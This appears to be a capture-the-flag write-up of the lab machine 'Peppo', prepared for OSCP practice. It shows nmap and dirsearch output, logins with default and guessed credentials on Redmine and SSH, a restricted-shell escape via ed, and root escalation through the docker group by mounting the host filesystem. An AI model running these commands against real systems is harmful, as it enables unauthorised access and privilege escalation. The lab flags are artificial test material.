# CTF Writeup: Peppo

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.198.60
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 17:35 EST
Nmap scan report for 192.168.198.60
Host is up (0.030s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE           VERSION
22/tcp    open   ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)
|_  256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)
|_auth-owners: root
113/tcp   open   ident             FreeBSD identd
|_auth-owners: nobody
5432/tcp  open   postgresql        PostgreSQL DB 9.6.0 or later
8080/tcp  open   http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
|_http-title: Redmine
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)
| http-robots.txt: 4 disallowed entries 
|_/issues/gantt /issues/calendar /activity /search
10000/tcp open   snet-sensor-mgmt?
|_auth-owners: eleanor
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Thu, 25 Dec 2025 22:35:52 GMT
|     Connection: close
|     Hello World
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Thu, 25 Dec 2025 22:35:46 GMT
|     Connection: close
|_    Hello World
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.95%I=7%D=12/25%Time=694DBC41%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\
SF:nDate:\x20Thu,\x2025\x20Dec\x202025\x2022:35:46\x20GMT\r\nConnection:\x
SF:20close\r\n\r\nHello\x20World\n")%r(HTTPOptions,71,"HTTP/1\.1\x20200\x2
SF:0OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Thu,\x2025\x20Dec\x20202
SF:5\x2022:35:46\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\n")%
SF:r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSStatusReques
SF:tTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n
SF:\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(TLSSession
SF:Req,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\
SF:r\n")%r(Kerberos,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nConnection:\x20close\r\n\r\n")%r(FourOhFourRequest,71,"
SF:HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Thu,\
SF:x2025\x20Dec\x202025\x2022:35:52\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:Hello\x20World\n")%r(LPDString,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(LDAPSearchReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(LDAPBindReq,2F,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SI
SF:POptions,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close
SF:\r\n\r\n")%r(LANDesk-RC,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(TerminalServer,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n");
Aggressive OS guesses: Linux 3.10 - 4.11 (96%), Linux 3.13 - 4.4 (96%), Linux 3.2 - 4.14 (94%), Linux 2.6.32 - 3.13 (93%), Linux 3.8 - 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.13 or 4.2 (90%), Linux 4.4 (90%), Linux 2.6.32 - 3.10 (90%), Linux 5.0 - 5.14 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Linux, FreeBSD; CPE: cpe:/o:linux:linux_kernel, cpe:/o:freebsd:freebsd

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   30.65 ms 192.168.45.1
2   30.64 ms 192.168.45.254
3   30.71 ms 192.168.251.1
4   30.72 ms 192.168.198.60

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.51 seconds
```

I started off with enumerating endpoints on the webpage running on port 8080.

```
dirsearch -u http://192.168.198.60:8080
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Peppo/reports/http_192.168.198.60_8080/_25-12-25_17-42-38.txt

Target: http://192.168.198.60:8080/

[17:42:38] Starting:                                                                                                                          
[17:42:46] 200 -  459B  - /404                                              
[17:42:46] 200 -  459B  - /404.html                                         
[17:42:46] 200 -  648B  - /500                                              
[17:42:48] 406 -    0B  - /activity.log                                     
[17:42:50] 302 -  150B  - /admin  ->  http://192.168.198.60:8080/login?back_url=http%3A%2F%2F192.168.198.60%3A8080%2Fadmin
[17:42:50] 401 -    0B  - /admin.php                                        
[17:42:50] 401 -    0B  - /admin.dat                                        
[17:42:50] 401 -    0B  - /admin.cgi
[17:42:50] 401 -    0B  - /admin.dll                                        
[17:42:50] 401 -    0B  - /admin.cfm
[17:42:50] 401 -    0B  - /admin.conf
[17:42:50] 401 -    0B  - /admin.js
[17:42:50] 401 -    0B  - /admin.jsp
[17:42:50] 401 -    0B  - /admin.asp                                        
[17:42:50] 401 -    0B  - /admin.aspx
[17:42:50] 401 -    0B  - /admin.passwd
[17:42:50] 401 -    0B  - /admin.old
[17:42:50] 401 -    0B  - /admin.mdb
[17:42:50] 401 -    0B  - /admin.epc
[17:42:50] 401 -    0B  - /admin.ex
[17:42:50] 401 -    0B  - /admin.htm
[17:42:50] 401 -    0B  - /admin.exe
[17:42:50] 401 -    0B  - /admin.do
[17:42:50] 401 -    0B  - /admin.mvc
[17:42:50] 401 -    0B  - /admin.shtml
[17:42:50] 302 -  155B  - /admin.html  ->  http://192.168.198.60:8080/login?back_url=http%3A%2F%2F192.168.198.60%3A8080%2Fadmin.html
[17:42:50] 401 -    0B  - /admin.py
[17:42:50] 401 -    0B  - /admin.php3                                       
[17:42:50] 401 -    0B  - /admin.pl
[17:42:50] 401 -    0B  - /admin.srf
[17:42:50] 401 -    0B  - /admin.woa
[17:42:50] 401 -    0B  - /admin.rb
[17:42:50] 302 -  153B  - /admin/  ->  http://192.168.198.60:8080/login?back_url=http%3A%2F%2F192.168.198.60%3A8080%2Fadmin%2F
[17:43:08] 200 -    8KB - /favicon.ico                                      
[17:43:13] 200 -   19KB - /issues                                           
[17:43:15] 200 -    5KB - /login                                            
[17:43:15] 200 -    5KB - /login.asp                                        
[17:43:15] 200 -    5KB - /login.aspx
[17:43:15] 200 -    5KB - /login.php
[17:43:15] 200 -    5KB - /login.jsp
[17:43:15] 200 -    5KB - /login.htm
[17:43:15] 200 -    5KB - /login.wdm%20                                     
[17:43:15] 200 -    5KB - /login.pl                                         
[17:43:15] 200 -    5KB - /login.wdm%2e                                     
[17:43:15] 200 -    5KB - /login.shtml
[17:43:15] 200 -    5KB - /login.cgi
[17:43:15] 200 -    5KB - /login.html
[17:43:15] 200 -    5KB - /login.rb
[17:43:15] 406 -   39B  - /login.json                                       
[17:43:15] 200 -    5KB - /login.srf                                        
[17:43:15] 200 -    5KB - /login.py
[17:43:15] 200 -    5KB - /login/
[17:43:15] 200 -  831B  - /login.js
[17:43:15] 302 -   93B  - /logout.jsp  ->  http://192.168.198.60:8080/      
[17:43:15] 302 -   93B  - /logout/  ->  http://192.168.198.60:8080/
[17:43:15] 302 -   93B  - /logout.php  ->  http://192.168.198.60:8080/
[17:43:15] 302 -   93B  - /logout.js  ->  http://192.168.198.60:8080/
[17:43:15] 302 -   93B  - /logout.aspx  ->  http://192.168.198.60:8080/
[17:43:15] 302 -   93B  - /logout.asp  ->  http://192.168.198.60:8080/      
[17:43:15] 302 -   93B  - /logout.html  ->  http://192.168.198.60:8080/     
[17:43:15] 302 -   93B  - /logout  ->  http://192.168.198.60:8080/          
[17:43:18] 401 -    0B  - /my.7z                                            
[17:43:18] 401 -    0B  - /my.key                                           
[17:43:18] 401 -    0B  - /my.rar
[17:43:18] 401 -    0B  - /my.tar
[17:43:18] 401 -    0B  - /my.zip
[17:43:19] 200 -    5KB - /news                                             
[17:43:19] 406 -    0B  - /news.jsp                                         
[17:43:19] 406 -    0B  - /news.php                                         
[17:43:19] 406 -    0B  - /news.aspx
[17:43:19] 406 -    0B  - /news.js
[17:43:19] 200 -    5KB - /news.html                                        
[17:43:24] 406 -    0B  - /projects.php                                     
[17:43:24] 406 -    0B  - /projects.aspx
[17:43:24] 200 -   12KB - /projects                                         
[17:43:24] 406 -    0B  - /projects.jsp
[17:43:24] 406 -    0B  - /projects.js
[17:43:24] 200 -   12KB - /projects.html                                    
[17:43:25] 200 -  103B  - /robots.txt                                       
[17:43:26] 406 -    0B  - /search.aspx                                      
[17:43:26] 406 -    0B  - /search.php                                       
[17:43:26] 406 -    0B  - /search.jsp                                       
[17:43:26] 406 -    0B  - /search.js                                        
[17:43:26] 200 -    8KB - /search                                           
[17:43:26] 200 -    8KB - /search.html                                      
[17:43:27] 401 -    0B  - /settings.php                                     
[17:43:27] 401 -    0B  - /settings.aspx                                    
[17:43:27] 401 -    0B  - /settings.jsp
[17:43:27] 401 -    0B  - /settings.js                                      
[17:43:27] 401 -    0B  - /settings.py                                      
[17:43:27] 401 -    0B  - /settings.php~                                    
[17:43:27] 403 -    0B  - /settings.xml
[17:43:27] 302 -  153B  - /settings  ->  http://192.168.198.60:8080/login?back_url=http%3A%2F%2F192.168.198.60%3A8080%2Fsettings
[17:43:27] 302 -  158B  - /settings.html  ->  http://192.168.198.60:8080/login?back_url=http%3A%2F%2F192.168.198.60%3A8080%2Fsettings.html
[17:43:27] 302 -  156B  - /settings/  ->  http://192.168.198.60:8080/login?back_url=http%3A%2F%2F192.168.198.60%3A8080%2Fsettings%2F
[17:43:33] 401 -    0B  - /users.aspx                                       
[17:43:33] 401 -    0B  - /users.php                                        
[17:43:33] 401 -    0B  - /users.ini
[17:43:33] 401 -    0B  - /users.db
[17:43:33] 401 -    0B  - /users.js
[17:43:33] 401 -    0B  - /users.jsp
[17:43:33] 401 -    0B  - /users.mdb                                        
[17:43:33] 401 -    0B  - /users.log
[17:43:33] 403 -    0B  - /users.json                                       
[17:43:33] 401 -    0B  - /users.sql                                        
[17:43:33] 401 -    0B  - /users.sqlite
[17:43:33] 401 -    0B  - /users.pwd
[17:43:33] 302 -  150B  - /users  ->  http://192.168.198.60:8080/login?back_url=http%3A%2F%2F192.168.198.60%3A8080%2Fusers
[17:43:33] 302 -  154B  - /users.csv  ->  http://192.168.198.60:8080/login?back_url=http%3A%2F%2F192.168.198.60%3A8080%2Fusers.csv
[17:43:33] 404 -    0B  - /users/login.aspx
[17:43:33] 404 -    0B  - /users/admin.php
[17:43:33] 404 -    0B  - /users/login.jsp
[17:43:33] 302 -  155B  - /users.html  ->  http://192.168.198.60:8080/login?back_url=http%3A%2F%2F192.168.198.60%3A8080%2Fusers.html
[17:43:33] 404 -    0B  - /users/login.php
[17:43:33] 401 -    0B  - /users.xls
[17:43:33] 302 -  153B  - /users/  ->  http://192.168.198.60:8080/login?back_url=http%3A%2F%2F192.168.198.60%3A8080%2Fusers%2F
[17:43:33] 404 -    0B  - /users/login.js
[17:43:33] 401 -    0B  - /users.txt
[17:43:33] 404 -    4KB - /users/login
[17:43:33] 404 -    4KB - /users/admin
[17:43:33] 404 -    4KB - /users/login.html                                 
                                                                             
Task Completed
```

The /admin endpoint provides an login functionality and is running "Redmine".

I searched up for Redmine default credentials and found admin:admin, I logged in with those
and it asked me to change the password of the admin user.

I then proceeded to change it to admin:password and gained access into the interface.

When navigating to the "Information" tab I retrieve version information:

```
Environment:
  Redmine version                4.1.1.stable
  Ruby version                   2.6.6-p146 (2020-03-31) [x86_64-linux]
  Rails version                  5.2.4.2
  Environment                    production
  Database adapter               SQLite
  Mailer queue                   ActiveJob::QueueAdapters::AsyncAdapter
  Mailer delivery                smtp
SCM:
  Subversion                     1.10.4
  Mercurial                      4.8.2
  Bazaar                         2.8.0
  Git                            2.20.1
  Filesystem                     
Redmine plugins:
  no plugin installed
```

## Initial Access

This admin dashboard didn't provide any exploitable functionality so I moved on.

After analyzing the nmap scan again I found out about an potential user named "eleanor".

```
10000/tcp open   snet-sensor-mgmt?
|_auth-owners: eleanor
```

I tried to log in with eleanor:eleanor in ssh and it worked!

```
ssh eleanor@192.168.198.60       
The authenticity of host '192.168.198.60 (192.168.198.60)' can't be established.
ED25519 key fingerprint is: SHA256:GrHKbhpl4waMainGkiieqFVD5jgXi12zVmCIya8UR7M
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.198.60' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
eleanor@192.168.198.60's password: 
Permission denied, please try again.
eleanor@192.168.198.60's password: 
Permission denied, please try again.
eleanor@192.168.198.60's password: 
Linux peppo 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
eleanor@peppo:~$
```

The ssh shell is very weak and has a lot of restrictions, we are not able to display files with cat or bash.

Let's view our current $PATH in order to find out which functions we can use.

```
eleanor@peppo:~$ echo $PATH
/home/eleanor/bin
```

```
eleanor@peppo:~$ ls -la /home/eleanor/bin
total 8
drwxr-xr-x 2 eleanor eleanor 4096 Jun  1  2020 .
drwxr-xr-x 4 eleanor eleanor 4096 Dec 26 18:07 ..
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chmod -> /bin/chmod
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chown -> /bin/chown
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ed -> /bin/ed
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ls -> /bin/ls
lrwxrwxrwx 1 root    root       7 Jun  1  2020 mv -> /bin/mv
lrwxrwxrwx 1 root    root       9 Jun  1  2020 ping -> /bin/ping
lrwxrwxrwx 1 root    root      10 Jun  1  2020 sleep -> /bin/sleep
lrwxrwxrwx 1 root    root      14 Jun  1  2020 touch -> /usr/bin/touch
```

We utilized "ed" an command line editor to escape the restricted shell.

```
eleanor@peppo:~$ ed
!/bin/bash
```

We then rewrote the $PATH variable and changed it to the /bin directory, to get access to all functions.

```
eleanor@peppo:~$ export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

It's now possible to utilize all the functions.

```
eleanor@peppo:~$ whoami
eleanor
```

Retrieved local.txt in /home/eleanor directory.

```
ea5ec97919676484560825c9e092dc31
```

## Privilege Escalation

We then enumerated that user "eleanor" seems to be in the docker group, we can utilize an PoC from gtfobins.github.io in order to elevate our privs.

```
eleanor@peppo:~$ id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
```

Enumerated docker images.

```
eleanor@peppo:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        5 years ago         542MB
postgres            latest              adf2b126dda8        5 years ago         313MB
```

I'm assuming those docker images both got created & are owned by root, so let's utilize the postgres docker image to elevate our privs. Gained Root RCE.

```
eleanor@peppo:~$ docker run -v /:/mnt --rm -it postgres chroot /mnt bash
root@012a7004eca3:/# 
```

Retrieved proof.txt in /root directory.

```
cae332a13e6dfed1402e97dfe445a2ae
```
